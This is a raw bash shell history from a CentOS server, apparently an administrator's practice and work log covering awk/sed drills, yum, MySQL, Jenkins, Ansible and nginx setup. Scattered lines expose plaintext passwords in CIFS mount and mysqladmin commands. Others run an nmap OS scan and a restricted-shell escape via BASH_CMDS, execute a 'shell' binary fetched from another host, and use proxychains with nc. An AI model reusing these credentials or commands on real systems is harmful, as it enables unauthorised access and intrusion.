cat unixbench.sh |tail -30
cat unixbench.sh |tail -n +30
cat unixbench.sh |tail -30
cat unixbench.sh |tail -n -30
cat unixbench.sh |tail -n -3
cat unixbench.sh |tail -n +3
cat unixbench.sh 
head -n 1
cat unixbench.sh |ead -n 1
cat unixbench.sh |head -n 1
cat unixbench.sh |head -1
cat unixbench.sh |head 1
cat unixbench.sh |head --1
cat unixbench.sh |head -n -1
cat unixbench.sh |tail -n -2
cat unixbench.sh |tail -2
cat unixbench.sh |tail -n 2
cat unixbench.sh |tail -n +2
cat unixbench.sh |head -n +1
ls shenme.txt 
ls
sh readfd.sh &> shenme.txt 
sh hell3.sh  >& shenme.txt 
cat shenme.txt 
sh readfd.sh &> shenme.txt 
cat shenme.txt 
traceroute
wall hello
i'mfine
write root pts/0
hello
i'mfine
write root pts/0
hello
write  root pts/0
mesg n
mesg
mesg n
mesg
awada
ls
ll
cd scripts01/
ls
ln file1 file-hardlink
ln -s file1 file-softlink
ll file*
state file1
stat file1
find . inum 806082998 2> /dev/null
find / inum 806082998 2> /dev/null
find / -inum 806082998 2> /dev/null 
find . -setfile file1
find . -samefile file1
logname /?
logname -man
logname -help
help logname
mbr
fdisk -l
php --version
vim /etc/php.ini 
free -m
free -h
free -wh
 cat /proc/cpuinfo |grep "physical id" |sort |uniq| wc -l
cat /proc/cpuinfo |grep "cpu cores" |sort |uniq| wc -l
cat /proc/cpuinfo |grep "processor"  | wc -l
history |grep mount
history |grep mount -t
wall hello
dasa
wall hello
vim /etc/pam.d/sshd 
history |grep mount -t
history |grep mount 

mount -t cifs -o username=administrator,password=Foxconn@8899 //10.148.52.202/shellcode /mnt/
mount -t cifs -o username=administrator,password=Foxconn@8899 //10.148.52.202/esxi  /mnt/
mount -t cifs -o username=administrator,password=Foxconn@8899 //10.148.52.202/esxi  /mnt/img
ping www.baidu.com
history |tail -200
mesg
wall hello
$
who 
$ write root pts/1
 write root pts/1
cat /etc/passwd
cat /etc/passwd |grep jack
cat /etc/passwd |grep user
cat /etc/passwd |grep ja
grep 'admin' /etc/passwd
grep 'admin' /etc/group
ip a
id admin
id root
id adm
nmap 
nmap -O 10.138.2.140
nmap -O 10.138.2.140 --osscan-guess
nmap -O 10.138.2.140 --osscan-limit
ssh 10.148.12.5
grep bash /etc/passwd
man sshd_config
visudo
vim /etc/hosts.allow
grep tally2 /etc/pam.d/sshd
grep tally2 /etc/pam.d/ssh
grep tally* /etc/pam.d/sshd
vim  /etc/pam.d/sshd
date
tail /var/log/secure-20200510 
ls -l /var/log/secure*
tail /var/log/secure
ssh localhost -v
vim /etc/pam.d/su
vim /etc/pam.d/sshd
ssh 10.134.99.64
timedatectl
vim /etc/sudoers
history |grep mount
cd scripts01/
ls
cat readPassword.sh 
cat readfd.sh 
cat listfd.sh
cd scripts01/
ls
vim rename.sh
rename.sh
sh rename.sh
vim rename.sh
sh rename.sh
vim rename.sh
sh rename.sh hell3 hello3
vim rename.sh
sh rename.sh hell3 hello3
ls hello3.sh
vim rename.sh
sh rename.sh hello3 hell3
ls hell*
cd
ls
cd scripts01/
ls
ll
vi 4
ll info.txt
vim info.txt
awk '{ print }' info.txt
vim info.txt
awk '{ print }' info.txt
awk -F '-'  '{ print }' info.txt
awk -F '-'  '{ print $1  }' info.txt
awk -F '-'  '{ print $0  }' info.txt
awk -F '-'  '{ print hello  }' info.txt
awk -F '-'  '{ print "hello"  }' info.txt
vim secCol.awk
awk -f secCol.awk info.txt 
awk '/admin/{print}' info.txt 
awk -F '-' '/admin/{print}' info.txt 
awk -F '-' '/admin/{print $1}' info.txt 
awk '$2 ~ /-/ {print $1}' info.txt 
awk '$1 ~ /-/ {print $1}' info.txt 
awk '$2 ~ /-/ {print $2}' info.txt 
awk '$2 ~ /-/ {print $3}' info.txt 
awk '$2 ~ /-/ {print $4}' info.txt 
awk '$2 ~ /-/ {print $5}' info.txt 
awk 'BEGIN {FS=":"} $1 == "root" {print $3}' /etc/passwd
awk 'BEGIN { FS=":" } $1 == "root" {print $3}' /etc/passwd
awk 'BEGIN { FS=":" } $1 == "root" { print $3 }' /etc/passwd
awk 'BEGIN { FS=":" } $1=="root" { print $3 }' /etc/passwd
cat /etc/passwd
awk 'BEGIN { FS=":" } $1=="root" { print $2 }' /etc/passwd
awk 'BEGIN { FS="-" } $2 ~ "etc" {print $1}' info.txt 
awk 'BEGIN { FS="-" } $2 ~ "etc" {print $0}' info.txt 
awk 'BEGIN {FS="-"} { if($2 ~"etc") {print $1}}' info.txt 
awk 'BEGIN {FS="-"} { if($2 ~"etc") {print $2}}' info.txt 
awk 'BEGIN { FS="-"} ($1 ~"Linux" || $2 ~ "network") {print}' info.txt 
awk 'BEGIN { FS="-"} ($1 ~"Linux" || $2 ~ "Network") {print}' info.txt 
cat > foundBlankline.awk
cat  foundBlankline.awk
cat > foundBlankline.awk
cat  foundBlankline.awk
cat > foundBlankline.awk
cat  foundBlankline.awk
cat mail.txt 
cat >> mail.txt 
cat mail.txt 
awk -f foundBlankline.awk mail.txt 
cat calint.awk
cat > calint.awk
awk calint.awk 
cat  calint.awk
awk -f calint.awk 
cat  calint.awk
vim calint.awk 
awk calint.awk 
vim calint.awk 
awk calint.awk  mail.txt 
awk calint.awk 
awk calint.awk  mail.txt 
vim calint.awk 
awk calint.awk  mail.txt 
cat >math.txt
awk '{print ($2^2) +1 }' math.txt 
awk '{print ($1^2) +1 }' math.txt 
awk '{print ($1^2) }' math.txt 
cat >math.txt
awk '{print ($1^2) }' math.txt 
awk 'BEGIN {a="100";print(a+1);}'
awk 'BEGIN{ a=100;b=100;print(a""b);}'
awk 'BEGIN{ a=100;b=100;print(a''b);}'
awk 'BEGIN{ a="ad";b="bc";print(a""b);}'
awk 'BEGIN{ a="ad";b="bc";print(a+b);}'
awk 'BEGIN{ a="ad";b="bc";print(a.b);}'
awk 'BEGIN{ a="ad";b="bc";print(a''b);}'
ping 10.134.196.24
history |grep mount
ls
cd scripts01/
ls
ls /
cd /tmp
ls
mount
free -m
free 
df -hT
fdisk -l
ls
cd
cd scripts01/
ls info.txt 
cat info.txt 
awk 'NF ==3 {print}' info.txt 
awk 'NF >3 {print}' info.txt 
awk 'FS="[[:space:]]" NF >3 {print}' info.txt 
awk 'FS="[[:space:]]+" NF >3 {print}' info.txt 
awk 'FS="[[:space:]]+" NF <3 {print}' info.txt 
awk 'FS="[[:space:]]+" NF =3 {print}' info.txt 
awk 'FS="[[:space:]]+" NF ==3 {print}' info.txt 
awk '{ if(NR  >3) { print NR".\t"$0 }}' info.txt 
awk '{ if(NR  >3) { print NR".\t"$1 }}' info.txt 
awk '{ i=1;while(i<=3) {print $i;i++} }' info.txt 
awk '{print $6}' info.txt 
awk '{print $1,$2}' info.txt 
awk '{ for(i=1;i<=3;i++){ print $i } }' info.txt 
awk '{ for(i=1;i<=3;i++) print $i  }' info.txt 
myarr[1]="one"
myarr[2]="123"
awk '{for(x in myarr) print myarr[x] }' 
awk '{ myarr[1]="one";myarr[2]="123";for(x in myarr) print myarr[x] }' 
awk
awk '{ myarr[1]="one";myarr[2]="123";for(x in myarr) print myarr[x] }' 
cat awkSearchpattern.sh
vim awkSearchpattern.sh
sh awkSearchpattern.sh 
vim awkSearchpattern.sh
sh awkSearchpattern.sh 
vim awkSearchpattern.sh
sh awkSearchpattern.sh 
vim awkSearchpattern.sh
cat info.txt 
sh awkSearchpattern.sh 
awk "/se/" '{i++;print} ' info.txt 
awk "/se/"'{i++;print} ' info.txt 
awk 'path=ENVIRON["PATH"] {print "the path is: " path}'
awk 'path=ENVIRON["PATH"] {print "the path is: " path}' /tmp/empty
x='awk -F'-' '/Linux/{ print $2}'info.txt' 
x='awk -F'-' '/Linux/ { print $2}'info.txt' 
x='awk -F'-' '/Linux/ {print $2}'info.txt' 
x='awk -F'-' '/Linux/ { print $2 }'info.txt' 
x='awk -F'-' '/Linux/ { print $2 }' info.txt' 
x='awk -F'-' '/Linux/{ print $2 }' info.txt' 
x='awk -F'-' '/Linux/{ print $2 }' info.txt

x='awk -F'-' '/Linux/{ print $2 }' info.txt'
x="awk -F'-' '/Linux/{ print $2 }' info.txt"
echo $x
x='awk -F:'-'  "/Linux/{ print $2 }" info.txt'
echo $x
x='awk   "/Linux/{ print $2 }" info.txt'
echo $x
awk -F'-' '/Linux/{ print $2 }' info.txt 
x=awk -F'-' '/Linux/{ print $2 }' info.txt 
x='awk -F'-' '/Linux/{ print $2 }' info.txt'
x="awk -F'-' '/Linux/{ print $2 }' info.txt"
echo $x
x='awk -F"-" '/Linux/{ print $2 }' info.txt'
x='awk -F"-" "/Linux/{ print $2 }" info.txt'
echo $x
x=`awk -F"-" "/Linux/{ print $2 }" info.txt`
echo $x
x=`awk -F"-" '/Linux/{ print $2 }' info.txt`
echo $x
z=`awk -F " - " '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` 
echo $z
z=`awk -F " -" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` 
echo $z
z=`awk -F "-" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` 
echo $z
z=`awk -F "-[[:space:]]?" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` 
echo $z
`awk -F "-[[:space:]]?" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` >defVar
cat defVar 
`awk -F "-[[:space:]]?" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` > defVar
`awk -F "-" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt` > defVar
awk -F "-[[:space:]]?" '{if($1 ~ "Linux") print "x="$2; if($1~ "stoarge") print "y="$2 }' info.txt > defVar
cat defVar 
source defVar 
echo $x
echo $y
vim defVar 
source defVar 
echo $y
vim defVar 
source defVar 
vim defVar 
；cd scripts01/
ls
cd scripts01/
vim defVar 
cd scripts01/
vim defVar 
vim /etc/yum.repos.d/CentOS-Base-Aliyun.repo 
vim /etc/yum.repos.d/CentOS-Base.repo
ls
mkdir yum
cd yum
ls
wget http://mirrors.163.com/centos/7.5.1804/os/x86_64/Packages/yum-3.4.3-158.el7.centos.noarch.rpm
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/yum-3.4.3-167.el7.centos.noarch.rpm
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/yum-metadata-parser-1.1.4-10.el7.x86_64.rpm
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/yum-plugin-fastestmirror-1.1.31-53.el7.noarch.rpm
pwd
history |grep scp
ping www.baidu.com
vim /etc/yum.repos.d/CentOS-Base.repo
vim /etc/profile
vim ~/.bash_profile 
env
vim /etc/bashrc 
vim ~/.bashrc 
vim /etc/profile
curl www.baidu.com
wget http://mirrors.163.com/.help/CentOS7-Base-163.repo 
rm -rf .
rm -rf *
ls
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/python-iniparse-0.4-9.el7.noarch.rpm
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/yum-metadata-parser-1.1.4-10.el7.x86_64.rpm
wget http://mirrors.163.com/centos/7/os/x86_64/Packages/yum-3.4.3-161.el7.centos.noarch.rpm
cd /etc/yum.repos.d/
lks
ls
vim CentOS-Base.repo
cd scripts01/
vim defVar 
vim letter_count.sh
ls
cat /etc/passwd
su - pro1
passwd pro1
BASH_CMDS[a]=/bin/bash;a
less /var/log
tail -100  /var/log/message
cat  /var/log/message
less  /var/log/message|tail -100
less  /var/log/messages|tail -100
less  /var/log/secure|tail -100
journalctl -xe
journalctl -xe|tail -200
crontab -e
cat /etc/cron
cat /etc/cron.daily/
cat /etc/crontab 
less /var/log/wtmp
w /var/log/wtmp
who /var/log/wtmp
lase
last
last|grep reboot
date
uptime -s
uptime
ls /tmp
cat shell 
q
scp 10.134.196.22:/root/shell .
ls
./shell 
ls
./shell
proxychains nc 10.134.196.22 80
./shell 
ls
bash
exit
ls
cat x.php
vim x.php
sh x.php
cat x.php
less x.php
php x.php
./x.php
chmod u+x x.php
./x.php
ll x.php
./x.php
vim x.php 
cat shell
cat x.php 
x.php
./x.php 
vim x.php
ll x.php 
x.php
ls
cd scripts01/
ls
vim socket.py
python 
python socket.py 
vim socket.py
python socket.py 
mv socket.py sockett001.py
python sockett001.py 
rm socket.pyc
python sockett001.py 
./shell
mysql -v
mysql -uroot-p
mysql -uroot -p
mysql -uroot -proot
mysqladmin -uroot password 'Foxconn99'
mysqladmin -u root password Foxconn99
mysqladmin -u root -p password Foxconn99
rpm -qa |grep mysql
vim /etc/my.cnf
cd /var/lib/mysql
ls /
ls /data/
ls
ln -s /var/lib/mysql /data
ls
cd..
cd ..
ls
ls /data
cd /data/mysql/
ls
wget https://github-production-release-asset-2e65be.s3.amazonaws.com/2093258/9d78fb60-2de4-11e8-8f0c-bac507a4e54f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20180906%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20180906T015544Z&X-Amz-Expires=300&X-Amz-Signature=0d3c55cae6f8073b54589eeb035d17c7c82bf525a7eb0b82d7e25766781028fb&X-Amz-SignedHeaders=host&actor_id=0&response-content-disposition=attachment%3B%20filename%3Dmha4mysql-node-0.58.tar.gz&response-content-type=application%2Foctet-stream
rpm --hepl
rpm --help
wget https://github.com/lzimd/mha-rpms/blob/master/mha4mysql-manager-0.57-0.el7.noarch.rpm
rpm -ivh mha4mysql-manager-0.57-0.el7.noarch.rpm 
file mha4mysql-manager-0.57-0.el7.noarch.rpm 
wget --help
ps -ef
ps -ef| awk {print $2 $3}
ps -ef| awk {print $2}
ps -ef| awk { print $2 }
ps -ef| awk '{ print $2 }'
ls
cd scripts01/
ls
vim ping_localnet.sh
sh ping_localnet.sh 
ping 10.134.196.156
ping 10.134.196.57
vim ping_localnet.sh
arp -a 
chattr -h
chattr --help
crontab -
crontab -e
grep --help |grep '\-v'
ps -ef |grep gogs |grep -v grep
ps -ef |grep git |grep -v grep
ps -ef |grep docker |grep -v grep
ps -ef |grep init |grep -v grep
at -l
at -h
ps -ef|grep 'crun'
ps -ef|grep  -v grep|grep 'crun' 
echo -h
echo --hepl
echo --help
help echo
echo
help echo
key=1212e
echo -e '$key\n##'
curl -h
curl -h |grep '\-f'||grep '\-s'
curl -h |grep '\-f';grep '\-s'
curl -h |grep '\-f'&& grep '\-s'
curl -h |grep '\-f' && grep '\-s'
curl -h |grep '\-[f|s|S|L|k]'
curl -h |grep '\-m'
ps axf -o "pid"
cat /proc/1756/cmdline
cat /proc/1756/cmdline|grep -a -E "javeUpDates"
echo $?
cat /proc/1756/cmdline|grep -a -E "javaUpDates"
echo $?
ls -l /proc/1756/exe |grep /tmp
echo $?
ps axf -o "pid %cpu"
cat /root/.ssh/known_hosts 
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts 
grep -h |grep '\-o'
grep --help |grep '\-o'
grep --help |grep '\-E'
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" /root/.ssh/known_hosts 
ifconfig
ifconfig ens160|grep "inet"|awk '{print $2}'
ifconfig ens160|grep "inet"|awk '{print $2}'|awk '{print $1}'
ifconfig ens160|grep "inet"|awk '{print $2}'|awk '{print r1}'
ifconfig ens160|grep "inet"|awk '{print $2}'|awk '{print 1r}'
ifconfig ens160|grep "inet"|awk '{print $2}'|head -1
ifconfig ens160|sed -n '2p'
ifconfig ens160|sed -n '2p'|awk {print $2}
ifconfig ens160|sed -n '2p'|awk '{print $2}'
ifconfig ens160|sed -nr 
ifconfig ens160|sed -nr '2s#^.*dr:(.*)Bc.*$#\1#gp'
ifconfig ens160|sed -nr '2s#^.*dr(.*)Bc.*$#\1#gp'
ifconfig ens160|sed -nr '2s#^.*d(.*)Bc.*$#\1#gp'
ifconfig ens160|sed -nr '2s#^.*d(.*)c.*$#\1#gp'
ifconfig ens160|sed -nr '2s#^.*dr(.*)Bc.*$#\1#gp'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*dr:##g'
ifconfig ens160|sed -n '2p'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*dr:##g'|sed 's# B.*##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*dr:##g'|sed 's# b.*##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*:##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*n##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*n##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*ne##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*et##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*i##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*inet##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*inet##g'|sed 's# n.*$##g
'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*inet##g'|sed 's# n.*$##g'
ifconfig ens160|sed -n '2p'|sed -r 's#^.*inet ##g'|sed 's# n.*$##g'
python
python3
ps axf -o 'pid'
ls -l /proc/1756/exe
ps axf -o 'pid'|while read procid; do ls -l /proc/$procid/exe|grep; /tmp
vim kill_sus_proc.sh
ls
cat /proc/$(ps axf -o 'pid')/exe|grep /tmp
$(ps axf -o 'pid')
vim kill_sus_proc.sh
sh kill_sus_proc.sh 
ps axf -o 'pid %cpu'
vim kill_sus_proc.sh
sh kill_sus_proc.sh 
vim /etc/crontab 
vim /etc/cron.d/0hourly 
vim /etc/cron.d/raid-check 
vim /etc/cron.d/vbirdlogfile 
ls /root/bin/
ls /root/bin/ -l
ls /root/bin/logfile/
ls /root/bin/logfile/logfile.sh 
cat /root/bin/logfile/logfile.sh 
vim /etc/cron.deny 
vim /etc/cron.hourly/0anacron 
vim /etc/cron.hourly/snapper 
vim /etc/cron.monthly/
vim /etc/cron.weekly/
ls -l  /etc/cron.weekly/
ls /var/spool/cron/root_crontab 
ls /var/spool/cron/  -al
vim  /var/spool/cron/root
vim  /var/spool/cron/root_crontab 
crontab -l 
vim /etc/crontab 
date mmdd
date +mmdd
cat /usr/local/nginx/logs/nginx.pid
set $2121  ada
echo $2121
env
set $ass kksk
echo $a
echo $ass
echo $2
echo $2121
set a kksk
echo $a
echo $kksk
set
aaa=bbb
set
set|grep aaa
grep -h
grep --help
geetenforce
getenforce
dig www.tmall.comm
dig www.tmall.com
dig www.baidu.com
dig www.qq.com
dig www.163.com
dig 2622114804@qq.com
dig +trace www.tmall.com
dig  www.tmall.com
rpm -aq |grep mysql
mysql -p
mysqladmin -u root password 'Foxconn99'
mysql -p
yum -y install ansible
jobs
kill -9 %1
jobs
cd /etc/yum.repos.d/
ls
mv CentOS-Base.repo.bak CentOS-Base.repo
mv CentOS-Base.repo.bak.bak CentOS-Base.repo
ls
vim CentOS-Base.repo 
env
yum clean all
yum clean all --verbose
yum makecache
yum clean all --verbose
yum clean all 
ls
vim zabbix.repo 
vim CentOS-Base-Aliyun.repo 
rm  CentOS-Base-Aliyun.repo 
ls
yum clean all
mv mysql-community.repo mysql-community.repo.bak
mv mysql-community-source.repo mysql-community-source.repo.bak
ls
yum clean all
yum makecache
yum -y install ansible
vim /etc/ansible/hosts 
ansible test1 -m ping -k
ansible docker02 -m ping -k
ansible root@docker02 -m ping -k
ansible 10.150.7.55 -m ping -k
vim /etc/ansible/hosts 
ansible root@docker02 -m ping -k
ansible  -m ping -k
ansible docker02  -m ping -k
ansible --list-hosts
ansible -l
vim /etc/ansible/ansible.cfg 
ansible docker02 ping
ansible docker02  -m ping
ansible docker02  -m ping -k
ansible docker02  -m shell uptime -a
ansible docker02  -m shell -a "uptime -r"
ansible docker02  -m shell -a "uptime"
ansible docker02  -m shell -a "uptime -V"
ansible-doc -l
ansible-doc -s command
ansible-playbook
ansible docker02 -m setup -a "filter=ansible_*_mb"
ansible docker02 -m setup -a "filter=ansible_eth0"
ip a
ansible docker02 -m setup -a "filter=ansible_ens*"
ansible docker02 -m setup -a "filter=ansible_ens160"
ansible all -m setup -a --tree /tmp/facts
ansible all -m setup  --tree /tmp/facts
ls /tmp/facts/
less /tmp/facts/docker02 
ls -alh
cd /etc/ansible/playbook
find / -d --name playbook
find /  --name playbook
find /  -name playbook
cd
ls
mkdir ./ansible_test
cd ansible_test/
cat install_httpd.yml
vim install_httpd.yml
which ansible-playbook
ansible-playbook -C install_httpd.yml 
ansible-playbook install_httpd.yml 
history
export HIDTTIMEFORMAT="%Y-%m-%d %H:%M:%S " >> /etc/profile
source /etc/profile
history |tail 20
mysql -p
mysqladmin -u root password 'Foxconn99'
mysql -p
yum -y install ansible
jobs
kill -9 %1
jobs
cd /etc/yum.repos.d/
ls
mv CentOS-Base.repo.bak CentOS-Base.repo
mv CentOS-Base.repo.bak.bak CentOS-Base.repo
ls
vim CentOS-Base.repo 
env
yum clean all
yum clean all --verbose
yum makecache
yum clean all --verbose
yum clean all 
ls
vim zabbix.repo 
vim CentOS-Base-Aliyun.repo 
rm  CentOS-Base-Aliyun.repo 
ls
yum clean all
mv mysql-community.repo mysql-community.repo.bak
mv mysql-community-source.repo mysql-community-source.repo.bak
ls
yum clean all
yum makecache
yum -y install ansible
vim /etc/ansible/hosts 
ansible test1 -m ping -k
ansible docker02 -m ping -k
ansible root@docker02 -m ping -k
ansible 10.150.7.55 -m ping -k
vim /etc/ansible/hosts 
ansible root@docker02 -m ping -k
ansible  -m ping -k
ansible docker02  -m ping -k
ansible --list-hosts
ansible -l
vim /etc/ansible/ansible.cfg 
ansible docker02 ping
ansible docker02  -m ping
ansible docker02  -m ping -k
ansible docker02  -m shell uptime -a
ansible docker02  -m shell -a "uptime -r"
ansible docker02  -m shell -a "uptime"
ansible docker02  -m shell -a "uptime -V"
ansible-doc -l
ansible-doc -s command
ansible-playbook
ansible docker02 -m setup -a "filter=ansible_*_mb"
ansible docker02 -m setup -a "filter=ansible_eth0"
ip a
ansible docker02 -m setup -a "filter=ansible_ens*"
ansible docker02 -m setup -a "filter=ansible_ens160"
ansible all -m setup -a --tree /tmp/facts
ansible all -m setup  --tree /tmp/facts
ls /tmp/facts/
less /tmp/facts/docker02 
ls -alh
cd /etc/ansible/playbook
find / -d --name playbook
find /  --name playbook
find /  -name playbook
cd
ls
mkdir ./ansible_test
cd ansible_test/
cat install_httpd.yml
vim install_httpd.yml
which ansible-playbook
ansible-playbook -C install_httpd.yml 
ansible-playbook install_httpd.yml 
history
export HIDTTIMEFORMAT="%Y-%m-%d %H:%M:%S " >> /etc/profile
source /etc/profile
history |tail 20
history |tail -20
#1598487590
set x y z
#1598487603
IFS=":;-"
#1598487612
echo "$*"
#1598599009
 export PATH=$PATH:/root/.linkerd2/bin
#1598599014
echo $PATH
#1598599020
linkerd check
cd ansible_test/
ls
vim install_httpd.yml 
cd
yum -y install java-1.8.0
d /etc/yum.repos.d/
cd /etc/yum.repos.d/
l
wget http://pkg.jenkins.io/redhat/jenkins.repo
rpm --import http:;//pkg.jenkins.io/redhat/jenkins.io.key
rpm --import http://pkg.jenkins.io/redhat/jenkins.io.key
yum install -y jenkins
history
rpm -al jenkins
rpm -ql jenkins
mkdir /data/jenkins -p
chown -R jenkins:jenkins /data/jenkins
vim /etc/sysconfig/jenkins 
systemctl start jenkins
systemctl start jenkins -l
systemctl status jenkins -l
journalctl -ex |tail -200
rpm -aq|grep java
vim /etc/sysconfig/jenkins 
systemctl start jenkins 
journalctl -ex |tail -200
vim /etc/sysconfig/jenkins 
systemctl start jenkins 
journalctl -ex |tail -200
vim /etc/sysconfig/jenkins 
systemctl start jenkins 
vim /etc/sysconfig/jenkins 
journalctl -ex |tail -200
less /var/lib/jenkins/secrets/initialAdminPassword 
rpm -ql java-1.8.0
rpm -ql java
rpm -ql java-1.8.0-openjdk-headless-1.8.0.262.b10-0.el7_8.x86_64
ls /usr/java/jdk
echo $JAVA_HOME
vim /root/.ssh/id_rsa
git config --global user.name "gitpty"
git version
gi config --global user.emai "eamil@example.com"
git config --global user.emai "eamil@example.com"
git config --list
vim /root/.ssh/
vim /root/.ssh/id_rsa.pub 
git clone https://github.com/gitPty/linux-k.git
ssh -vT git@github.com
ulimit -n
cat /proc/cpuinfo
cat /proc/cpuinfo|grep "physical id"
cat /proc/cpuinfo|grep "cpu cores"
cat /proc/cpuinfo|grep "processor"|wc -l
cat /proc/cpuinfo|grep "processor"
getconf PAGESIZE
ulimit Cu
ulimit -u
ulimit -a
cd /root/ansible_test/
ls
ansible docker02 -m shell "ls -al"
history |grep ansible
ansible docker02 -m shell "ls"
ansible docker02 -m shell 
ansible docker02 -m shell ls
docker images
kubectl get po
kubectl get po --all-namespaces
kubectl get no
#1598409810
history
#1598409830
vim /etc/profile
#1598409907
export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S " >> /etc/profile
#1598409910
source /etc/profile
#1598409913
history
#1598409937
vim /etc/profile
#1598410144
type -a time
#1598410801
rpm -qa|grep java
#1598412875
echo $JAVE_HOME
#1598413126
rpm -ql java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64
#1598413144
mkdir /usr/java
#1598413413
finger -h
#1598413425
man finger
#1598413461
sudo -l
#1598421820
vim /root/.ssh/authorized_keys 
#1598421995
ssh git@github.com:gitPty/jenkins.git
#1598422059
ssh git@github.com
#1598422207
vim /root/.ssh/authorized_keys 
#1598422353
vim /root/.ssh/id_rsa
#1598422652
ssh git@github.com:gitPty/jenkins.git
#1598422716
cd /tmp
#1598422723
git clone git@github.com:gitPty/jenkins.git
#1598423405
git clone git@github.com:gitPty/linux-k.git
#1598423697
ssh -T git@github.com
#1598424120
locate .gitconfig
#1598424128
vim /root/.gitconfig 
#1598424326
vim /root/.ssh/config
#1598424442
ssh -T git@github.com
#1598425059
vim 1.pub
#1598426964
ls
#1598426970
vim id_rsa.pub 
#1598433636
apache
#1598433652
rpm -qa|grep httpd
#1598433659
rpm -qa|grep apache
#1598435826
rpm -qa|grep nginx
#1598435851
ps -ef|grep nginx|grep -v grep
#1598435855
ps -ef|grep nginx
#1598435898
vim /etc/nginx/nginx.conf
#1598435962
nginx -h
#1598435969
nginx -v
#1598435978
nginx -V
#1598436020
nginx -s start
#1598436028
nginx -s reload
#1598436078
systemctl start nginx
#1598436084
systemctl status nginx
#1598436108
vim /etc/nginx/nginx.conf
#1598438328
history|grep ansible
#1598438453
 ansible docker02  -m shell -a -h
#1598438460
 ansible docker02  -m shell --help
#1598438588
 ansible docker02  -m shell -a "ls -al"
#1598438615
 ansible docker02  -m shell -a "hostname"
#1598440484
nginx -V
#1598440504
nginx -V|grep with
#1598440536
nginx -V|grep "http_stub_status_moudle"
#1598440579
nginx -V|grep "--with-http_stub_status_moudle"
#1598440606
nginx -V|grep "--with-http_stub_status_module"
#1598443100
ls /var/log/messages-20200802 
#1598443103
less /var/log/messages-20200802 
#1598443123
cat  /var/log/messages-20200802 |cut -d " " -f4|uniq-c
#1598443126
cat  /var/log/messages-20200802 |cut -d " " -f4|uniq -c
#1598443143
cat  /var/log/messages-20200802 |cut -d " " -f4|uniq -c|sort -n -r
#1598443174
cat  /var/log/messages-20200802 |cut -d " " -f4|uniq -c|wc -l
#1598485731
vim ./helloword.sh
#1598485821
sh helloword.sh 
#1598486078
5.4*3|bc
#1598486085
5.4 * 3|bc
#1598486093
5*3
#1598486096
5*3|bc
#1598486101
bc 5*3
#1598486108
bc --help
#1598486130
expr(5*3)
#1598486137
expr5*3
#1598486139
expr 5*3
#1598486143
expr 5 * 3
#1598486149
expr 5\*3
#1598486233
expr 5 \* 3
#1598487237
mystring=""
#1598487260
echo ${mystring:+ NOte:kksk.}
#1598487298
echo ${mystring? errot}
#1598487304
echo ${mystring? error:sasdaad}
#1598487348
echo ${mystring:? error:sasdaad}
#1598487371
echo ${mystring:- kksk}
#1598487378
echo $mystring
#1598487430
 mystring="hi"
#1598487438
echo ${mystring:+ NOte:kksk.}
#1598487445
echo $mystring
#1598487491
echo ${mystring:= NOte:kksk.}
#1598487496
echo $mystring
#1598487516
echo ${mystring:=NOte:kksk.}
#1598487518
echo $mystring
#1598487586
bash
#1598487637
echo $IFS
#1598487678
5.4 \* 3|bc
#1598487775
bc
#1598487818
echo 5.4*3 |bc
#1598487842
echo "scale=7;355/113" |bc
#1598487947
echo "ibase=16; 1000"|bc
#1598488004
echo "scale=100;a(1)*4"|bc
#1598488013
echo "scale=100;a(1)*4"|bc -l
#1598488187
iptables
#1598488195
iptables -L
#1598488323
vim helloword.sh 
#1598488352
sh helloword.sh 
#1598489049
python''
#1598496023
cd 
#1598496025
ls
#1598496027
cd scripts01/
#1598496028
ls
#1598496036
vim except_ssh.sh
#1598496254
except --help
#1598496261
vim except_ssh.sh
#1598496296
mv  except_ssh.sh expect_ssh.sh
#1598496310
expect --help
#1598521503
iptables --help
#1598521515
iptables --help|grep '\-T'
#1598521680
iptables -L
#1598523857
ping 192.168.218.128
#1598525184
cat /proc/cpuinfo
#1598525200
cat /proc/cpuinfo|grep "processor"|wc -l
#1598525219
cat /proc/cpuinfo|grep "physical*"
#1598525228
cat /proc/cpuinfo|grep "physical id"
#1598525236
cat /proc/cpuinfo|grep "physical id"|uniq -c
#1598525244
cat /proc/cpuinfo|grep "physical id"|uniq 
#1598525699
date 
#1598525707
history|grep date
#1598525736
date +%Y:%m%d
#1598528194
locate access.log
#1598528251
cat /var/log/nginx/access.log|awk '$9!=200{print $11}'|sort|uniq -c |sort -k1,1nr|head -5
#1598528258
